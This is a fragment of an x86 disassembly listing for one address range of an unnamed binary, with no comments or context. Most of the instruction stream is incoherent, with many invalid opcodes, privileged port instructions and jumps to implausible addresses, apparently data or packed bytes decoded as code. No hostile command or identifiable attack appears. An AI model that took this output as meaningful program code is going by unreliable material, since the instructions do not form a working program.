  408714:	cmp    ch,BYTE PTR ds:0xc426b368
  40871a:	(bad)  
  40871b:	mov    ebp,0x2828f22a
  408720:	(bad)  
  408721:	xor    DWORD PTR [ebp-0x1f],esi
  408724:	loope  0x40870d
  408726:	(bad)  
  408727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408728:	int3   
  408729:	pushf  
  40872a:	leave  
  40872b:	loopne 0x408763
  40872d:	xor    DWORD PTR [edi-0x15],esp
  408730:	stc    
  408731:	add    al,0x80
  408733:	mov    gs,WORD PTR [edx+0x2cdae808]
  408739:	xor    bh,bh
  40873b:	adc    DWORD PTR [ecx],ebx
  40873d:	out    dx,al
  40873e:	inc    eax
  40873f:	jmp    0xc07f8150
  408744:	mov    dh,0x30
  408746:	(bad)  
  408747:	fdivr  st(1),st
  408749:	sbb    al,0x0
  40874b:	pop    esi
  40874c:	add    al,0x30
  40874e:	push   0xffc5b64a
  408753:	rol    BYTE PTR [eax],0x0
	...
  408766:	sti    
  408767:	add    al,0x0
  408769:	add    BYTE PTR [ebx],dl
  40876b:	div    DWORD PTR [eax+ecx*1+0x4b]
  40876f:	jmp    0xfc74:0xf6ccfffd
  408776:	fdiv   QWORD PTR [edi+eax*1-0x18]
  40877a:	mov    eax,ds:0xcafffea5
  40877f:	lds    eax,FWORD PTR [ebx]
  408781:	add    BYTE PTR [esi-0x79001385],dh
  408787:	or     al,ch
  408789:	hlt    
  40878a:	enter  0xfef6,0xb
  40878e:	adc    esp,DWORD PTR [eax+0x38]
  408791:	push   0x402e33
  408796:	jae    0x408774
  408798:	mov    BYTE PTR [ebx+0x504ffa5c],ch
  40879e:	stos   DWORD PTR es:[edi],eax
  40879f:	or     BYTE PTR [eax],al
  4087a1:	out    dx,eax
  4087a2:	lea    esp,[ecx+0x5]
  4087a5:	cmp    ah,dl
  4087a7:	or     BYTE PTR [eax-0x1],dl
  4087aa:	out    0x0,al
  4087ac:	call   0xff3ad701
  4087b1:	pop    eax
  4087b2:	mov    ebx,0x9def0003
  4087b7:	pusha  
  4087b8:	or     bh,BYTE PTR [edx]
  4087ba:	ror    BYTE PTR [eax],cl
  4087bc:	push   eax
  4087bd:	jmp    esi
  4087bf:	add    al,ch
  4087c1:	cmp    al,0x9f
  4087c3:	stc    
  4087c4:	(bad)  
  4087c5:	call   0x3f59c5
	...
  4087da:	add    BYTE PTR [eax],al
  4087dc:	stos   BYTE PTR es:[edi],al
  4087dd:	ret    0x7
  4087e0:	push   es
  4087e1:	jle    0x4087cf
  4087e3:	and    DWORD PTR [edi-0x6ff9614],0xb
  4087ea:	push   DWORD PTR [ebp-0x35]
  4087ed:	fisttp DWORD PTR [ecx-0x7705e35c]
  4087f3:	inc    ebp
  4087f4:	cli    
  4087f5:	fldcw  WORD PTR [ecx+0xb58ad19]
  4087fb:	call   0xff754e8f
  408800:	adc    bl,bh
  408802:	xor    al,0x75
  408804:	add    al,dh
  408806:	mov    bh,bh
  408808:	(bad)  
  408809:	fisubr WORD PTR [ecx+0xb90851b]
  40880f:	call   0xff75968f
  408814:	jne    0x4087a6
  408816:	aaa    
  408817:	jmp    edi
  408819:	and    eax,0x69ea42b
  40881e:	xor    eax,0x32938c9
  408823:	push   ebp
  408824:	or     DWORD PTR [ecx],0x1e4ec481
  40882a:	scas   al,BYTE PTR es:[edi]
  40882b:	or     edx,DWORD PTR [edx-0x46]
  40882e:	push   0x43323dff
  408833:	movd   DWORD PTR [edx+0x3],mm7
  408837:	add    dl,bh
  408839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883a:	mov    ebp,0x13c879fb
	...
  40884f:	add    BYTE PTR [eax],al
  408851:	add    BYTE PTR [esi-0x158acbe1],ah
  408857:	jbe    0x408807
  408859:	sti    
  40885a:	and    al,BYTE PTR [edx+0x69]
  40885d:	inc    DWORD PTR ds:0x92fbbdb4
  408863:	push   edx
  408864:	stc    
  408865:	inc    eax
  408866:	cli    
  408867:	xchg   esi,eax
  408868:	scas   al,BYTE PTR es:[edi]
  408869:	sti    
  40886a:	loop   0x408813
  40886c:	push   0xac0ce5ff
  408871:	(bad)  
  408872:	fnstsw WORD PTR [edi+0x75]
  408875:	push   eax
  408876:	aad    0x31
  408878:	or     ebp,eax
  40887a:	mov    ecx,0xd2ff3464
  40887f:	add    eax,0x2ebd5d3d
  408884:	rcr    edx,1
  408886:	repz ret 
  408888:	call   0x4171afc1
  40888d:	popf   
  40888e:	push   ebx
  40888f:	cs inc esi
  408891:	rcl    DWORD PTR ds:0x5424e904,cl
  408897:	aad    0x35
  408899:	scas   al,BYTE PTR es:[edi]
  40889a:	cmc    
  40889b:	sbb    al,0x8b
  40889d:	dec    ebx
  40889e:	test   DWORD PTR [esi],ebp
  4088a0:	adc    DWORD PTR [eax+0x54],esi
  4088a3:	cs push ds
  4088a5:	stos   DWORD PTR es:[edi],eax
  4088a6:	xor    al,0xeb
  4088a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a9:	add    ebp,DWORD PTR [ebp-0x48]
  4088ac:	or     al,0x2b
  4088ae:	mov    edi,0xca34065a
  4088b3:	pushf  
  4088b4:	call   0x4088bc
	...
  4088c5:	add    BYTE PTR [eax],al
  4088c7:	add    BYTE PTR [ebp+0x6f],ah
  4088ca:	cdq    
  4088cb:	xor    al,0xc7
  4088cd:	cld    
  4088ce:	add    BYTE PTR [edx+0x1ce62e32],al
  4088d4:	push   0xa233de67
  4088d9:	mov    ah,0x12
  4088db:	lds    ebp,FWORD PTR ds:0x1230542f
  4088e1:	jmp    0xd55dbc78
  4088e6:	push   eax
  4088e7:	add    eax,0xd4771dfa
  4088ec:	or     al,0xb8
  4088ee:	loopne 0x40890b
  4088f0:	call   0x46b4:0x1233a63c
  4088f7:	xor    esi,ebp
  4088f9:	sub    eax,0x9be2301c
  4088fe:	inc    esi
  4088ff:	xor    esp,ebp
  408901:	cmp    ebp,DWORD PTR [ebx+0x71d7fa00]
  408907:	and    BYTE PTR [ecx+0x48],bh
  40890a:	add    BYTE PTR [ebp+0x6c],dh
  40890d:	sub    eax,0xb808d369
  408912:	pop    es
  408913:	push   ecx
  408914:	cmp    eax,0x375eff62
  408919:	enter  0xc3fb,0xf9
  40891d:	call   0xbe8:0x5634e19
  408924:	jmp    0xfa148856
  408929:	call   0x0:0x3622
	...
  40893c:	add    BYTE PTR [eax],al
  40893e:	push   ebx
  40893f:	add    eax,0x2dc8d7e8
  408944:	call   DWORD PTR [ebx+0x1e1b9af9]
  40894a:	mov    bl,0x5
  40894c:	call   0xff6eb234
  408951:	cmp    DWORD PTR [edx-0x16],0xb7fe940
  408958:	push   DWORD PTR [ecx+edx*2+0x25]
  40895c:	sti    
  40895d:	test   DWORD PTR [eax],0x545c682e
  408963:	(bad)  
  408964:	call   DWORD PTR [edx+0x55]
  408967:	cs jne 0x40895b
  40896a:	adc    DWORD PTR [ecx],esp
  40896c:	(bad)  
  40896d:	(bad)  
  40896e:	call   0x3f54160f
  408973:	sub    eax,0xb7e8e569
  408978:	pop    es
  408979:	shr    DWORD PTR [edx-0x374900d2],1
  40897f:	mov    bh,0xfb
  408981:	scas   al,BYTE PTR es:[edi]
  408982:	inc    edx
  408983:	add    eax,0x2d951be8
  408988:	push   DWORD PTR [eax+0x3c00013f]
  40898e:	ins    DWORD PTR es:[edi],dx
  40898f:	sbb    DWORD PTR [ecx-0xcbfe5b],eax
  408995:	add    BYTE PTR [ebp+eax*4+0x45],dh
  408999:	cld    
  40899a:	repz div DWORD PTR [eax+edx*1+0x44]
  40899f:	ins    DWORD PTR es:[edi],dx
  4089a0:	or     ebp,eax
	...
  4089b2:	add    BYTE PTR [eax],al
  4089b4:	mov    esp,DWORD PTR [eax-0x1]
  4089b7:	dec    eax
  4089b9:	enter  0x850e,0x5c
  4089bd:	add    DWORD PTR [eax],eax
  4089bf:	add    ah,bl
  4089c1:	cmp    al,0xf7
  4089c3:	add    BYTE PTR [ebx+0x4ec70008],dl
  4089c9:	hlt    
  4089ca:	inc    BYTE PTR [edi]
  4089cc:	mov    ds:0xb9006a08,eax
  4089d1:	or     BYTE PTR [edx+0x0],ch
  4089d4:	mov    ecx,0xdf458d08
  4089d9:	push   edi
  4089da:	mov    WORD PTR [ebp-0x110f1],es
  4089e0:	mov    bl,0xf7
  4089e2:	je     0x4089dc
  4089e4:	hlt    
  4089e5:	ins    BYTE PTR es:[edi],dx
  4089e6:	sti    
  4089e7:	call   0x3fea55
  4089ec:	dec    eax
  4089ed:	enter  0x573,0xfa
  4089f1:	sub    DWORD PTR [eax],eax
  4089f3:	add    BYTE PTR [ebx-0x70],dl
  4089f6:	scas   eax,DWORD PTR es:[edi]
  4089f7:	sub    BYTE PTR [edx],dl
  4089f9:	add    edi,edi
  4089fb:	jne    0x408a30
  4089fd:	adc    BYTE PTR ds:0x4ff644a9,ch
  408a03:	mov    esp,DWORD PTR [ebx-0x54]
  408a06:	test   ah,dh
  408a08:	pop    esp
  408a09:	idiv   dh
  408a0b:	push   eax
  408a0c:	icebp  
  408a0d:	or     BYTE PTR ds:0x88f644a9,bl
  408a13:	test   DWORD PTR [ebx-0x12],eax
  408a16:	(bad)  
  408a17:	inc    DWORD PTR [eax]
	...
  408a29:	add    BYTE PTR [ebx+0x72],ch
  408a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2d:	call   DWORD PTR [edx+ecx*4-0x7e059801]
  408a34:	out    dx,al
  408a35:	inc    eax
  408a36:	cli    
  408a37:	jp     0x408ab0
  408a39:	lock in eax,0x82
  408a3c:	xor    edi,edi
  408a3e:	dec    edi
  408a3f:	sbb    bl,BYTE PTR [ebx]
  408a41:	jbe    0x4089e5
  408a43:	mov    dl,0x30
  408a45:	mov    DWORD PTR [edi-0x57],edi
  408a48:	cmp    bh,bh
  408a4a:	mov    ebp,0xb2680357
  408a4f:	out    0xc2,eax
  408a51:	jmp    FWORD PTR [eax+ecx*4-0x455a08cc]
  408a58:	xor    BYTE PTR [ebp-0x12],dh
  408a5b:	aad    0xcc
  408a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a5e:	xchg   ebp,eax
  408a5f:	jmp    0xff30:0xeaa2857a
  408a66:	jns    0x408a00
  408a68:	pop    ds
  408a69:	idiv   DWORD PTR [ebp-0x1e]
  408a6c:	add    esi,DWORD PTR [edx+ebp*1-0x6a]
  408a70:	add    eax,DWORD PTR [eax]
  408a72:	pop    ebp
  408a73:	rcr    DWORD PTR [ebx+0x35d20b3],cl
  408a79:	jmp    DWORD PTR [edi+0x55ff3911]
  408a7f:	sub    dh,BYTE PTR [esi+0x3b066207]
  408a85:	inc    DWORD PTR [ebp-0x7b]
  408a88:	add    al,BYTE PTR [eax]
  408a8a:	dec    ebp
  408a8b:	arpl   WORD PTR [ebx+0xbd],bx
	...
  408a9d:	add    BYTE PTR [eax],al
  408a9f:	add    al,dh
  408aa1:	fadd   QWORD PTR [ebx]
  408aa3:	jmp    DWORD PTR [edi+0x41]
  408aa6:	cmp    bh,bh
  408aa8:	and    eax,0x1207b63a
  408aad:	mov    ?,WORD PTR [edx]
  408aaf:	call   DWORD PTR ds:0x5e86d9e
  408ab5:	jb     0x408ae7
  408ab7:	add    BYTE PTR [esi-0x20064d3],cl
  408abd:	add    edx,DWORD PTR [esi-0x1c8e9d8f]
  408ac3:	ret    0x2bed
  408ac6:	pop    esp
  408ac7:	sbb    ebp,ebp
  408ac9:	sub    cl,BYTE PTR [esi-0x6f0298d0]
  408acf:	jne    0x408a94
  408ad1:	sub    bh,BYTE PTR [esi-0x65]
  408ad4:	cli    
  408ad5:	add    al,0x86
  408ad7:	jno    0x408b2b
  408ad9:	imul   esi,DWORD PTR [ebx-0x63d4423e],0x1b
  408ae0:	lods   eax,DWORD PTR ds:[esi]
  408ae1:	sub    bl,BYTE PTR [esi+0x30]
  408ae4:	daa    
  408ae5:	std    
  408ae6:	inc    eax
  408ae7:	lea    esi,[ebx+0x67304e2a]
  408aed:	sbb    DWORD PTR [esi],edi
  408aef:	xor    BYTE PTR [ebp-0x7298d6e3],dl
  408af5:	sub    dh,BYTE PTR [esi]
  408af7:	jbe    0x408a8b
  408af9:	xor    ch,BYTE PTR [esi]
  408afb:	xor    BYTE PTR [edx+0x75304d70],dl
  408b01:	sub    dl,BYTE PTR [ebx+esi*1+0x0]
	...
  408b15:	add    BYTE PTR [ebp+0x2a],ah
  408b18:	push   ss
  408b19:	xor    bh,ch
  408b1b:	clc    
  408b1c:	or     eax,0x3d1cf5b6
  408b21:	xor    DWORD PTR [ebp+0x2a],edx
  408b24:	(bad)  
  408b25:	jne    0x408b71
  408b27:	xor    dh,dh
  408b29:	das    
  408b2a:	push   edx
  408b2b:	mov    WORD PTR [ebp+0x30],es
  408b2e:	cmp    eax,0x232c2c2a
  408b33:	cmp    eax,0x2a2d2fdf
  408b38:	pop    esp
  408b39:	xor    BYTE PTR [edx],dl
  408b3b:	es push edi
  408b3d:	add    al,0xfa
  408b3f:	cmp    ebp,DWORD PTR [ebx+0x71cffa00]
  408b45:	and    BYTE PTR ds:0xe1e4ffb0,cl
  408b4b:	cmp    ebp,DWORD PTR [eax-0x40023252]
  408b51:	sbb    eax,0xe3c7a1e7
  408b56:	mov    dh,0x29
  408b58:	dec    edi
  408b59:	xor    DWORD PTR [ecx+eiz*2-0x46397101],0x19f9e967
  408b64:	mov    esi,0x40ef5211
  408b69:	jmp    0xe1b5b617
  408b6e:	loope  0x408b4f
  408b70:	enter  0xe566,0xcc
  408b74:	addr16 call 0xc1fea573
	...
  408b8a:	add    BYTE PTR [eax],al
  408b8c:	pop    ss
  408b8d:	out    dx,eax
  408b8e:	inc    eax
  408b8f:	jmp    0xf1b5b65d
  408b94:	icebp  
  408b95:	adc    ecx,ecx
  408b97:	fstp   QWORD PTR ds:[edi*1-0x36d62a73]
  408b9f:	sub    edi,DWORD PTR [esi+0x29]
  408ba2:	push   esp
  408ba3:	jb     0x408bbf
  408ba5:	xchg   ah,al
  408ba7:	sbb    eax,0xe969d244
  408bac:	or     DWORD PTR [esi],0xffffffff
  408baf:	xchg   esp,eax
  408bb0:	popa   
  408bb1:	and    DWORD PTR [ebp+0x48],ebx
  408bb4:	and    eax,0x1da4892a
  408bb9:	jle    0x408bf0
  408bbb:	xchg   ecx,eax
  408bbc:	and    esp,eax
  408bbe:	jmp    DWORD PTR [ecx+0x4b]
  408bc1:	int    0x27
  408bc3:	sub    dh,bh
  408bc5:	test   BYTE PTR [edi],bh
  408bc7:	jmp    0xe9fc10f8
  408bcc:	stc    
  408bcd:	add    al,0x68
  408bcf:	adc    BYTE PTR [ebx],0xc4
  408bd2:	(bad)  
  408bd3:	push   ebp
  408bd5:	or     BYTE PTR [eax+0xb052376],dh
  408bdb:	rol    bh,0x6a
  408bde:	aas    
  408bdf:	or     BYTE PTR [ebx],0x5
  408be2:	je     0x40904c
  408be8:	xor    ecx,DWORD PTR [ecx+0x1123aa8]
  408bee:	call   0x408ce0
	...
  408bff:	add    BYTE PTR [eax],al
  408c01:	add    BYTE PTR [edi],al
  408c03:	add    DWORD PTR [eax],eax
  408c05:	pop    edx
  408c06:	loopne 0x408bce
  408c08:	dec    edi
  408c09:	call   0x3f3138
  408c0e:	jecxz  0x408c60
  408c10:	addr16 add bl,dl
  408c13:	pop    es
  408c14:	mov    esi,0x401e9768
  408c19:	add    BYTE PTR [ebx-0x29],dh
  408c1c:	je     0x408c26
  408c1e:	cmp    edi,DWORD PTR [esi-0x38]
  408c21:	jmp    FWORD PTR [esp+edi*1]
  408c24:	add    DWORD PTR [bp+di-0x41f9],esp
  408c29:	push   0x401e0d
  408c2e:	arpl   di,dx
  408c30:	je     0x408c3a
  408c32:	cmp    eax,DWORD PTR [edx+0xc1cffc8]
  408c38:	mov    dl,0xa3
  408c3a:	or     al,0xd7
  408c3c:	jmp    0x5341:0x39a17b43
  408c43:	dec    edi
  408c44:	out    0x41,eax
  408c46:	aad    0x3
  408c48:	add    BYTE PTR [ebx],cl
  408c4a:	and    esi,DWORD PTR [eax+0x33]
  408c4d:	push   esi
  408c4e:	sti    
  408c4f:	pop    edi
  408c50:	lods   al,BYTE PTR ds:[esi]
  408c51:	dec    DWORD PTR [ebx+edx*2+0x4f]
  408c55:	push   0xbeef0423
  408c5a:	retf   
  408c5b:	lods   al,BYTE PTR ds:[esi]
  408c5c:	cmp    DWORD PTR [ecx-0x6],eax
  408c5f:	sbb    eax,0x25a7fed3
  408c64:	sbb    edx,DWORD PTR [ebp+0x0]
	...
  408c77:	add    BYTE PTR [edx+0x3f],al
  408c7a:	sub    eax,0x31ca258
  408c7f:	out    dx,eax
  408c80:	inc    esp
  408c81:	(bad)  
  408c82:	ins    DWORD PTR es:[edi],dx
  408c83:	cmp    bh,BYTE PTR [ebx+0x6ffed31d]
  408c89:	sbb    eax,DWORD PTR ss:[ecx-0x3e]
  408c8d:	xchg   BYTE PTR ds:0x2cbb57e8,ch
  408c93:	call   ecx
  408c95:	sbb    al,0xc5
  408c97:	jg     0x408cad
  408c99:	push   ds
  408c9a:	mov    dh,0xf9
  408c9c:	xor    al,0xaa
  408c9e:	lock mov edi,0xff2cae83
  408ca4:	mov    ebp,0xfd385dab
  408ca9:	xchg   BYTE PTR cs:[ebp-0x53],al
  408cad:	(bad)  
  408cae:	sub    al,0x6a
  408cb0:	add    bh,cl
  408cb2:	mov    dh,0x7
  408cb4:	xchg   edx,eax
  408cb5:	fisubr DWORD PTR ds:0xe05395ff
  408cbb:	inc    BYTE PTR [edi]
  408cbd:	sbb    edi,DWORD PTR ss:[ecx+0x6a2cee84]
  408cc4:	(bad)  
  408cc6:	mov    dh,0x7
  408cc8:	(bad)  
  408cc9:	into   
  408cca:	sub    eax,0x49956dff
  408ccf:	cmp    bh,BYTE PTR [ebx+0x1d352c1d]
  408cd5:	inc    ebp
  408cd6:	ret    0x54ff
  408cd9:	test   al,0xfa
  408cdb:	out    0x0,eax
	...
  408ced:	add    BYTE PTR [ebx],cl
  408cef:	sub    DWORD PTR [edi+edi*8],ebp
  408cf2:	rcl    BYTE PTR [ebx],cl
  408cf4:	jmp    0xfa00:0x185fa40
  408cfb:	add    al,0x69
  408cfd:	sub    al,0xa7
  408cff:	cld    
  408d00:	ror    BYTE PTR [edi+eiz*1],1
  408d03:	daa    
  408d04:	(bad)  
  408d05:	sub    al,0xa7
  408d07:	sub    dh,cl
  408d09:	mov    dh,0xfd
  408d0b:	sbb    al,0x6b
  408d0d:	arpl   WORD PTR ds:0x32ce1e27,cx
  408d13:	inc    edx
  408d14:	in     eax,dx
  408d15:	add    esp,DWORD PTR [edi-0x417d4285]
  408d1b:	push   ebp
  408d1c:	sahf   
  408d1d:	sub    al,0xed
  408d1f:	js     0x408d45
  408d21:	xor    BYTE PTR [edx+0x26],cl
  408d24:	sbb    al,0x14
  408d26:	fnsave [eax-0x4fc3e424]
  408d2c:	call   0xee858e34
  408d31:	xchg   BYTE PTR [eax],bh
  408d33:	add    ebp,ecx
  408d35:	add    esi,DWORD PTR [ebp-0x5fc8f40]
  408d3b:	add    al,0xe9
  408d3d:	inc    esp
  408d3e:	aaa    
  408d3f:	xor    DWORD PTR [esi+0x4],ebx
  408d42:	cli    
  408d43:	add    al,0xc3
  408d45:	add    edx,DWORD PTR [eax]
  408d47:	add    eax,0x52003c3
  408d4c:	je     0x408d14
  408d4e:	mov    ebp,edx
  408d50:	imul   eax,DWORD PTR [esi+0x0],0x0
	...
  408d63:	add    BYTE PTR [esi+0x2a2c362e],cl
  408d69:	es mov ah,0x2b
  408d6c:	jne    0x408d1e
  408d6e:	and    al,0x1b
  408d70:	adc    dh,BYTE PTR [eax+0x44f103e8]
  408d76:	popf   
  408d77:	push   es
  408d78:	push   ebx
  408d79:	add    bl,ch
  408d7b:	add    edi,edx
  408d7d:	pushf  
  408d7e:	cmp    bl,bl
  408d80:	mov    edx,0xf5b5fe04
  408d85:	sbb    al,0x0
  408d87:	mov    dl,0xd7
  408d89:	and    eax,0x54b299ff
  408d8e:	lea    ebp,[edx+ebp*8+0x2d]
  408d92:	(bad)  
  408d93:	fimul  WORD PTR [esi-0x2c]
  408d96:	out    0x2,eax
  408d98:	cwde   
  408d99:	and    eax,0x357b60ff
  408d9e:	test   esi,0x8b811ce1
  408da4:	shl    DWORD PTR ds:0x2661e96a,1
  408daa:	cmp    ch,BYTE PTR [eax]
  408dac:	(bad)  
  408dad:	and    eax,0x262999b5
  408db2:	call   FWORD PTR [esi+0x6de7f9ab]
  408db8:	pop    ebx
  408db9:	jmp    DWORD PTR es:[eax+0x7b]
  408dbd:	and    bh,dh
  408dbf:	xchg   BYTE PTR [ecx],ah
  408dc1:	fwait
  408dc2:	call   DWORD PTR [eax]
  408dc4:	(bad)  
  408dc5:	jmp    0x0:0xe940
	...
  408dd8:	add    BYTE PTR [eax],al
  408dda:	adc    BYTE PTR [eax-0x10],dh
  408ddd:	jbe    0x408dc0
  408ddf:	and    eax,0x1da5dcff
  408de4:	imul   eax,DWORD PTR [ecx+edx*8+0x26c8925],0x744eff2e
  408def:	and    eax,0xc49cdb67
  408df4:	(bad)  
  408df5:	cmp    eax,0x36f7350b
  408dfa:	shl    DWORD PTR ds:0xb711dd75,1
  408e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e01:	and    DWORD PTR es:[ebp+eax*4+0x11],edi
  408e06:	sub    DWORD PTR [esi],esp
  408e08:	inc    DWORD PTR [ebx-0x2de56307]
  408e0e:	ds and eax,0xf10e00fe
  408e14:	idiv   bh
  408e16:	inc    esp
  408e17:	fidiv  DWORD PTR [esp+ecx*1-0x5]
  408e1b:	sub    eax,0xa824ffa4
  408e20:	test   ah,bl
  408e22:	dec    esp
  408e23:	(bad)  
  408e25:	lea    ebx,[esi+0x44fff6e1]
  408e2b:	push   ecx
  408e2c:	addr16 sub ebp,eax
  408e2f:	aas    
  408e30:	(bad)  
  408e31:	dec    BYTE PTR [esi+0x44fff6f1]
  408e37:	fidiv  DWORD PTR [edi+edi*1]
  408e3a:	cli    
  408e3b:	aas    
  408e3c:	jmp    edi
	...
  408e4e:	add    BYTE PTR [eax],al
  408e50:	shl    DWORD PTR [ebp-0x37170002],cl
  408e56:	jae    0x408e71
  408e58:	push   eax
  408e59:	lods   eax,DWORD PTR ds:[esi]
  408e5a:	fcomip st,st(7)
  408e5c:	test   bh,ch
  408e5e:	add    esi,DWORD PTR [ebp-0x2d]
  408e61:	out    dx,eax
  408e62:	das    
  408e63:	(bad)  
  408e64:	pop    esi
  408e65:	shl    dh,1
  408e67:	inc    DWORD PTR [eax+edi*1-0x19]
  408e6b:	fnsave [edx]
  408e6d:	out    dx,eax
  408e6e:	(bad)  
  408e6f:	jmp    0x408e40
  408e71:	and    edi,DWORD PTR [edi-0x18c7628c]
  408e77:	shl    DWORD PTR [edx-0x11],1
  408e7a:	inc    bh
  408e7c:	push   cs
  408e7d:	shl    dh,1
  408e7f:	inc    DWORD PTR [ebp+esi*8-0x1]
  408e83:	jmp    DWORD PTR [ebx-0x332f7b63]
  408e89:	out    dx,al
  408e8a:	(bad)  
  408e8b:	push   eax
  408e8c:	mov    ebx,0x63413a16
  408e91:	out    dx,eax
  408e92:	mov    ah,0xf0
  408e94:	or     al,0xef
  408e96:	(bad)  
  408e97:	dec    DWORD PTR [esi-0x53a18e4]
  408e9d:	shr    DWORD PTR [ecx],1
  408e9f:	inc    DWORD PTR [ebx+0x4df74ea9]
  408ea5:	or     eax,DWORD PTR [esi+0x291b5ebd]
  408eab:	(bad)  
  408eac:	cli    
  408ead:	sub    bh,BYTE PTR [edi-0x65]
  408eb0:	cli    
  408eb1:	sub    eax,0x8303
	...
  408ec6:	outs   dx,DWORD PTR ds:[esi]
  408ec7:	cmp    dh,BYTE PTR [ecx]
  408ec9:	jmp    DWORD PTR ds:0x6c83f82e
  408ecf:	add    eax,DWORD PTR cs:[eax]
  408ed2:	jns    0x408e65
  408ed4:	sbb    al,0xf7
  408ed6:	or     eax,0x7e0f044b
  408edb:	lods   eax,DWORD PTR ds:[esi]
  408edc:	add    eax,DWORD PTR [eax]
  408ede:	cli    
  408edf:	lds    edx,FWORD PTR [ebx]
  408ee1:	add    ch,ah
  408ee3:	mov    bl,0x28
  408ee5:	jne    0x408ee9
  408ee7:	jbe    0x408f11
  408ee9:	popf   
  408eea:	in     eax,0x82
  408eec:	sub    DWORD PTR [ebp-0xd67d32],esi
  408ef2:	aad    0xf8
  408ef4:	sti    
  408ef5:	out    0x2a,eax
  408ef7:	lods   al,BYTE PTR ds:[esi]
  408ef8:	sub    bh,bh
  408efa:	(bad)
  408efd:	idiv   DWORD PTR [ebp+0x275289a]
  408f03:	xchg   dh,al
  408f05:	popf   
  408f06:	lods   eax,DWORD PTR ds:[esi]
  408f07:	stos   BYTE PTR es:[edi],al
  408f08:	sub    BYTE PTR [ebp-0xd74562],dh
  408f0e:	popf   
  408f0f:	inc    eax
  408f10:	sti    
  408f11:	out    0xce,eax
  408f13:	mov    bl,0x28
  408f15:	dec    DWORD PTR [ebp-0x7a08b460]
  408f1b:	loop   0x408f45
  408f1d:	jne    0x408f11
  408f1f:	lds    edi,FWORD PTR [edi]
  408f21:	popf   
  408f22:	jne    0x408f16
  408f24:	sub    BYTE PTR [ebp+0x291e044e],dh
	...
  408f3a:	add    BYTE PTR [eax],al
  408f3c:	and    edx,DWORD PTR gs:[ebx+edi*8+0x2976fc55]
  408f44:	push   ebp
  408f45:	xchg   DWORD PTR [eax+edx*2+0x45],ecx
  408f49:	and    eax,DWORD PTR [esi]
  408f4b:	add    al,0xce
  408f4d:	jmp    FWORD PTR [ecx+0x67]
  408f50:	sub    bl,BYTE PTR [ebx]
  408f52:	imul   BYTE PTR [eax]
  408f54:	(bad)  
  408f55:	cdq    
  408f56:	fidivr DWORD PTR [edi+esi*2+0x38]
  408f5a:	fisubr WORD PTR [eax]
  408f5c:	and    eax,0xa7291923
  408f61:	or     al,0xc1
  408f63:	(bad)  
  408f64:	ja     0x408f89
  408f66:	into   
  408f67:	sbb    al,0x0
  408f69:	scas   eax,DWORD PTR es:[edi]
  408f6a:	call   0xd14d1e97
  408f6f:	jnp    0x408fd0
  408f71:	and    esi,DWORD PTR [esi-0x49d650d8]
  408f77:	sub    ch,ch
  408f79:	sub    eax,0x22e5639d
  408f7e:	sahf   
  408f7f:	outs   dx,BYTE PTR ds:[esi]
  408f80:	into   
  408f81:	sbb    dl,BYTE PTR [esi+0x492ce228]
  408f87:	sub    ch,cl
  408f89:	and    bh,BYTE PTR [ebx+ebx*1]
  408f8c:	int    0x22
  408f8e:	jle    0x408fab
  408f90:	pushf  
  408f91:	gs jbe 0x408fbc
  408f94:	mov    ch,0x58
  408f96:	lea    esi,[eax]
  408f98:	lods   eax,DWORD PTR ds:[esi]
  408f99:	and    dl,BYTE PTR [ecx+0x54]
  408f9c:	pop    edx
  408f9d:	and    bl,BYTE PTR [esi+0x28]
	...
  408fb0:	add    BYTE PTR [eax],al
  408fb2:	cmp    DWORD PTR [bp+0x28],ebx
  408fb6:	xchg   ebp,eax
  408fb7:	sub    eax,0x228d6321
  408fbc:	inc    esi
  408fbd:	outs   dx,BYTE PTR ds:[esi]
  408fbe:	mov    bl,BYTE PTR [edx]
  408fc0:	sub    BYTE PTR ds:[ebp-0x68],bh
  408fc4:	jmp    esp
  408fc6:	and    bl,BYTE PTR [eax+0x1fe04107]
  408fcc:	jmp    DWORD PTR [esi]
  408fce:	adc    bl,BYTE PTR [eax-0x10]
  408fd1:	push   ss
  408fd2:	adc    ah,BYTE PTR [edx]
  408fd4:	call   0xff62691e
  408fd9:	push   cs
  408fda:	mov    WORD PTR [edx],ds
  408fdc:	jmp    0xff62ac15
  408fe1:	dec    BYTE PTR [edi+0x6effe81e]
  408fe7:	and    bh,bh
  408fe9:	and    BYTE PTR [edi-0x5ec3fff0],dh
  408fef:	xor    BYTE PTR [ebx-0x512d5b],al
  408ff5:	inc    edx
  408ff6:	add    ah,BYTE PTR [edx]
  408ff8:	jne    0x408fdb
  408ffa:	icebp  
  408ffb:	bound  ebx,QWORD PTR [ebp+0x458bddc6]
  409001:	mov    ebp,0x283ac55e
  409006:	(bad)  
  409007:	and    DWORD PTR ds:0xffc4ceee,esi
  40900d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40900e:	stos   DWORD PTR es:[edi],eax
  40900f:	or     eax,ebp
  409011:	sbb    edx,DWORD PTR [ebx]
  409013:	and    bh,bh
  409015:	add    DWORD PTR [eax],eax
	...
  409027:	add    BYTE PTR [edi+0x71e940de],bh
  40902d:	add    eax,DWORD PTR [eax]
  40902f:	jmp    0xf1b5b1ad
  409034:	loope  0x408fda
  409036:	cld    
  409037:	jbe    0x409016
  409039:	and    DWORD PTR [ebp+0x6d],esi
  40903c:	aad    0x97
  40903e:	pop    es
  40903f:	push   ecx
  409040:	dec    edi
  409041:	cmp    bh,0x5e
  409044:	fild   WORD PTR [esi+0x4]
  409047:	jmp    0x692d1ef6
  40904c:	cmp    bl,BYTE PTR [ecx]
  40904e:	inc    BYTE PTR [eax]
  409050:	cmp    al,0xea
  409052:	imul   eax,DWORD PTR [eax],0x75ff0ca9
  409058:	pop    ebx
  409059:	std    
  40905a:	jno    0x408ff9
  40905c:	sbb    al,0xea
  40905e:	mov    BYTE PTR [ebp+0x1f],al
  409061:	add    DWORD PTR [ebx],0x8d055301
  409067:	test   esp,esi
  409069:	jmp    0x71d1:0xfd93fffe
  409070:	push   ebx
  409071:	add    eax,0x39c7c00b
  409076:	cmp    al,0x4
  409078:	and    al,BYTE PTR ds:0x7d367700
  40907e:	pop    eax
  40907f:	cmp    edx,edx
